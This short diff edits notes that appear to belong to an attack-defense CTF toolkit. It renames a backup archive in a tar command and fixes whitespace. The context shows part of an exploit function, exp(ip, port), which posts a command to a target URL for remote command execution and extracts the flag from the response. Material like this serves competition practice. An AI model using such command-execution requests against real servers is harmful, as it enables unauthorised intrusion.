@@ -11,7 +11,7 @@
 解包
 
 ```sh
-tar -xvf backup.tar.gz
+tar -xvf backup.tgz
 ```
 
 ### 备份数据库
@@ -311,7 +311,7 @@ def exp(ip, port):
   resp = s.post(url + name, data={
     sign: cmd
   }).text # 命令执行
-    
+
   # resp = base64.b64decode(resp.encode()).decode()
 
   flag = FLAG_RE.findall(resp)[0] # 找到flag
